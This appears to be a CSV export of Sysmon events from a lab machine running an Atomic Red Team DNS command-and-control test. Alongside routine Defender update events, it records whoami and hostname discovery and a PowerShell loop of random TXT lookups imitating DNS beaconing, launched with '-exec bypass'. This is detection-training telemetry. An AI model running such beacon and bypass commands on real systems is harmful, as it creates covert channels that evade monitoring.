"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:26:13.535 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173835,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_qp5fb1bh.hfc.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","CreationUtcTime: 2025-12-26 10:26:13.463 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:13.465","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.310 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173886,"Rule: EXE ¦ Path: C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 1400 ¦ PGUID: E9F06A57-5FE2-694E-1C00-000000002400","CreationUtcTime: 2025-12-26 10:26:22.308 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:22.308","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:24.310 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173919,"Rule: DLL ¦ Path: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{E902FEA3-5613-4777-AC61-4AC5A44E6FCA}\mpengine.dll ¦ Proc: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.6-0\MsMpEng.exe ¦ PID: 2868 ¦ PGUID: E9F06A57-5FE5-694E-3700-000000002400","CreationUtcTime: 2025-12-26 10:26:24.310 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:24.310","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.422 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173903,"Rule: InvDB-Path ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\LowerCaseLongPath ¦ c:\windows\softwaredistribution\download\install\am_delta.exe ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.415","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.423 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173904,"Rule: InvDB-Pub ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\Publisher ¦ microsoft corporation ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.417","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.423 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173905,"Rule: InvDB-CompileTimeClaim ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\LinkDate ¦ 12/26/2025 01:12:42 ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.417","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.423 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173906,"Rule: InvDB-Ver ¦ EventType: SetValue ¦ TgtObj: \REGISTRY\A\{cfe890db-d959-cafe-c246-c166727f869c}\Root\InventoryApplicationFile\am_delta.exe|9025d818d4db6f5e\BinProductVersion ¦ 1.443.332.0 ¦ Proc: C:\WINDOWS\System32\svchost.exe ¦ PID: 2648 ¦ PGUID: E9F06A57-5FE4-694E-3000-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:26:23.417","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:10.839 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173832,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7188 ¦ PGUID: E9F06A57-62C2-694E-3D02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:10.819","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:10.887 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173833,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1348 ¦ PGUID: E9F06A57-62C2-694E-3E02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:10.883","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:12.673 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173834,"Cmdline: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type \""""TXT\"""" \""""atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io\"""" -QuickTimeout}} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:26:12.649","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1071_004x.evtx"
